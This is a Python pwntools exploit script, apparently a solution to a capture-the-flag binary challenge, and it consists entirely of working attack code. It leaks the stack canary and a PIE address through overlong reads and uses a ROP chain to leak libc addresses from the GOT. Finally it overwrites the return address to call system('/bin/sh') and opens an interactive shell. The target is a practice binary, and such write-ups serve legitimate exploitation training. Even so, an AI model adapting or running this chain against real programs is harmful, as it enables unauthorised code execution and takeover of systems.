#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('./chal_patched', checksec = False)
libc = ELF('./libc.so.6', checksec = False)

p = process(elf.path)

payload1 = b'x' * (0x110 - 0x7)
p.sendafter(b"What's your name?\n", payload1) 
p.recvuntil(payload1)
canary_leaked = u64(b'\x00' + p.recv(7)) 
log.info('canary = ' + hex(canary_leaked))

payload2 = b'x' * (0x110 - 0x8) + p64(canary_leaked) + b'x' * 8 + b'\xdd'
p.sendafter(b'you?\n', payload2)

payload3 = b'x' * (0x110 + 0x8)
p.sendafter(b"What's your name?\n", payload3) 
p.recvuntil(payload3)
main68_leaked = u64(p.recv(6) + b'\x00\x00')
log.info('main68 = ' + hex(main68_leaked))
main_leaked = main68_leaked - 68 

main = elf.symbols['main']
offset = main_leaked - main 
pop_rdi = offset + 0x0000000000001353 
ret = offset + 0x000000000000101a
read_got = offset + elf.got['read']
printf_got = offset + elf.got['printf']
puts_got = offset + elf.got['puts']
puts_plt = offset + elf.plt['puts']
vuln = offset + elf.symbols['vuln']

payload4 = b'x' * (0x110 - 0x8) + p64(canary_leaked) + b'x' * 8 + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(pop_rdi) + p64(printf_got) + p64(puts_plt) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)
p.sendafter(b'you?\n', payload4)
p.recvuntil(b'too!\n')
read_leaked = u64(p.recv(6) + b'\x00\x00') 
p.recvuntil(b'\n')
printf_leaked = u64(p.recv(6) + b'\x00\x00') 
p.recvuntil(b'\n')
puts_leaked = u64(p.recv(6) + b'\x00\x00') 
p.recvuntil(b'\n')
log.info('read = ' + hex(read_leaked))
log.info('printf = ' + hex(printf_leaked))
log.info('puts = ' + hex(puts_leaked))

libc.address = puts_leaked - libc.symbols['puts']
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))

p.sendafter(b"What's your name?\n", b'george') 

payload5 = b'x' * (0x110 - 0x8) + p64(canary_leaked) + b'x' * 8 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
p.sendafter(b'you?\n', payload5)

p.interactive()